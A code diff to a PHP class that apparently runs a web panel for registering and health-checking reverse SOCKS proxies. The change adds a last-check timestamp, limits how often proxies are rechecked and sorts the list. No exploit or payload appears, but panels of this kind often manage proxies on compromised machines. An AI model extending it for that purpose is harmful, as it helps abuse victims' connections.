@@ -25,32 +25,41 @@ class reverse_socks{
 
 
         if(!empty($_GET["check"])){
-            $sql = "SELECT * FROM reverse_socks";
+            $sql = "SELECT * FROM reverse_socks WHERE `lastcheck` < (NOW() - INTERVAL 30 MINUTE)";
             foreach ($GLOBALS["pdo"]->query($sql) as $row) {
 
                 if(!$this->check($row["ip"],$row["status"])){
                     $statement = $GLOBALS["pdo"]->prepare("DELETE FROM reverse_socks WHERE id = :id ");
                     $statement->execute(array('id' => $row["id"]));
+                }else{
+                    $statement = $GLOBALS["pdo"]->prepare("UPDATE reverse_socks SET lastcheck = CURRENT_TIMESTAMP() WHERE id = ?");
+                    $statement->execute(array($row["id"]));
                 }
             }
         }
 
-        $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM reverse_socks");
+        $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM reverse_socks ORDER BY lastcheck");
         $statement->execute(array());
         $all =array();
         while($row = $statement->fetch()) {
             $all[] = $row;
         }
         $GLOBALS["tpl"]->assign("all", $all);
-
-
     }
 
 
     public function reverse_socks_controll(){
+        $sql = "SELECT * FROM reverse_socks WHERE `lastcheck` < (NOW() - INTERVAL 10 MINUTE) LIMIT 10";
+        foreach ($GLOBALS["pdo"]->query($sql) as $row) {
 
-
-
+            if(!$this->check($row["ip"],$row["status"])){
+                $statement = $GLOBALS["pdo"]->prepare("DELETE FROM reverse_socks WHERE id = :id ");
+                $statement->execute(array('id' => $row["id"]));
+            }else{
+                $statement = $GLOBALS["pdo"]->prepare("UPDATE reverse_socks SET lastcheck = CURRENT_TIMESTAMP() WHERE id = ?");
+                $statement->execute(array($row["id"]));
+            }
+        }
         if(!empty($_POST["ip"])){
 
             try{
@@ -77,7 +86,7 @@ class reverse_socks{
                 }else{
 
                     file_put_contents("socks","OK");
-                    $statement = $GLOBALS["pdo"]->prepare("INSERT INTO reverse_socks (ip, status, country, country_name,country_city) VALUES (:ip, :status, :country, :country_name, :country_city)");
+                    $statement = $GLOBALS["pdo"]->prepare("INSERT INTO reverse_socks (ip, status, country, country_name,country_city,lastcheck) VALUES (:ip, :status, :country, :country_name, :country_city,CURRENT_TIMESTAMP())");
                     $result = $statement->execute(array('ip' => $_POST["ip"], 'status' =>  $_POST["port"], 'country' => $country, 'country_name' => $countryName,"country_city" =>$countryCity));
                 }
 
